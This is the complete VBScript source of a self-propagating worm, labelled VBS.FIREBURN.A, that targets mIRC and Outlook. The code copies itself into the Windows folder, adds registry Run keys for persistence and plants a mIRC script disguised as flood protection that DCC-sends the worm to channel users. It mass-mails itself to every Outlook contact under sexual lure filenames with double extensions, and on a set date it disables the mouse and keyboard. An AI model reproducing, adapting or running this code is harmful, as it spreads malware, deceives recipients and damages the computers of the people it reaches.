'VBS.FIREBURN.A -- mIRC/Outlook worm coded by fireburn 

on error resume next
dim fso,reg,x,win,random,filename,progdir,language
set fso=createobject("scripting.filesystemobject")
set reg=createobject("wscript.shell")
set win = fso.getspecialfolder(0)
set x=fso.getfile(wscript.scriptfullname)
x.copy(win&"\rundll32.vbs")
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSrundll32","rundll32.vbs"
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","FireburN"
progdir=reg.regread ("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if progdir="C:\Programme" then 
 language="german"
end if
randomize
random= Int((8 * Rnd) + 1)
select case random
 case "1" filename="Ultra-Hardcore-Bondage.JPG.vbs"                                             
 case "2" filename="Christina__NUDE!!!.JPG.vbs"                                             
 case "3" filename="CuteJany__BigTits!.GIF.vbs"                                             
 case "4" filename="MyGirlfriend__NUDE!.JPG.vbs"                                             
 case "5" filename="Aguiliera__NUDE!!.JPG.vbs"                                             
 case "6" filename="!Jany__Gets-fucked!.GIF.vbs"                                             
 case "7" filename="cute__EmmaPeel!!!.JPG.vbs"                                             
 case "8" filename="Julie17__xxx.GIF.vbs"                                             
end select
mircwrite("C:\mirc")
mircwrite(progdir&"\mirc")
outlook()
payload()
'-----------Begin script.ini write
sub mircwrite(mircdir)
 dim writem
 if fso.fileexists(mircdir&"\mirc.ini") then
  set writem=fso.createtextfile(mircdir&"\script.ini",true)
  writem.writeline (";Advanced flood-protection Script(c) - Keep this loaded")
  writem.writeline (";~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
  writem.writeline ("[script]")
  writem.writeline ("n0=on 1:start:{")
  writem.writeline ("n1= .remote on")
  writem.writeline ("n2= .ctcps on")
  writem.writeline ("n3= .events on")
  writem.writeline ("n4= }")
  writem.writeline ("n5= on 1:connect: {")
  writem.writeline ("n6= /.rename "&win&"\rundll32.vbs "&win&"\system\"&filename)
  writem.writeline ("n7= /join #virus | /.msg #virus Burn, Burn, Burn :)")
  writem.writeline ("n8= }")
  writem.writeline ("n9= on 1:disconnect: {")
  writem.writeline ("n10= /.rename "&win&"\system\"&filename&" "&win&"\rundll32.vbs")
  writem.writeline ("n11 = }")
  writem.writeline ("n12 =on 1:join:#:{")
  writem.writeline ("n13 =if ( $nick == $me ) { halt } | .dcc send $nick "&win&"\system\"&filename)
  writem.writeline ("n14 = }")
  writem.writeline ("n15 =on 1:text:*script*:#:/.ignore $nick")
  writem.writeline ("n16 =on 1:text:*script*:?:/.ignore $nick")
  writem.writeline ("n17 =on 1:text:*virus*:#:/.ignore $nick")
  writem.writeline ("n18 =on 1:text:*virus*:?:/.ignore $nick")
  writem.writeline ("n19 =on 1:text:*worm*:#:/.ignore $nick")
  writem.writeline ("n20 =on 1:text:*worm*:?:/.ignore $nick")
  writem.writeline ("n21 =on 1:text:*sex*:#:{")
  writem.writeline ("n22 = if ( $nick == $me ) { halt } | .dcc send $nick "&win&"\system\"&filename)
  writem.writeline ("n23 =}")
  writem.writeline ("n24 =on 1:text:die lamer:#:/quit I'll commit suicide! R.I.P")
  writem.writeline ("n25 =on 1:text:*fire*:#:/say $chan Burn Burn Burn :)")
  writem.writeline ("n26 =on 1:text:nick:#:/nick Smurf_Me")
  writem.writeline ("n27 =alias unload {halt}")
  writem.writeline ("n28 =alias remove {halt}")
  writem.close
 end if
end sub
'-------Begin Outlookspread
sub outlook
dim outlook,mapi,mail,cont
 x.copy (win&"\"&filename)
 Set outlook=CreateObject("Outlook.Application")
 Set mapi=outlook.GetNameSpace("MAPI")
 For Each victim In mapi.AddressLists
   If victim.AddressEntries.Count <> 0 Then
     Set mail=outlook.CreateItem(0)
     For counter=1 To victim.AddressEntries.Count
       Set cont = victim.AddressEntries(counter)
       mail.BCC = mail.BCC &";"&cont.Address
     next
 if language="german" then
   mail.subject="Moin, alles klar?"
   mail.body="Hi, wie geht's dir?"&chr(13)&"Guck dir mal das Photo im Anhang an, ist echt geil ;)"&chr(13)_
              &"bye, bis dann.."
   mail.attachments.add win&"\"&filename
   mail.DeleteAfterSubmit = True
   mail.send
 else 
   mail.subject="Hi, how are you?"
   mail.body="Hi, look at that nice Pic attached !"&chr(13)&"Watching it is a must ;)"&chr(13)_
              &"cu later..."
   mail.attachments.add win&"\"&filename
   mail.DeleteAfterSubmit = True
   mail.send
 end if 
 end if
 next
end sub
'---------Begin Payload Check
sub payload
if day(now())=20 AND month(now())=6 then
 msgbox "I'm proud to say that you are infected by FireburN !",4096,"FireburN"
 reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Shut_Up","rundll32 mouse,disable"
 reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Shut_Up2","rundll32 keyboard,disable"
end if
end sub




 

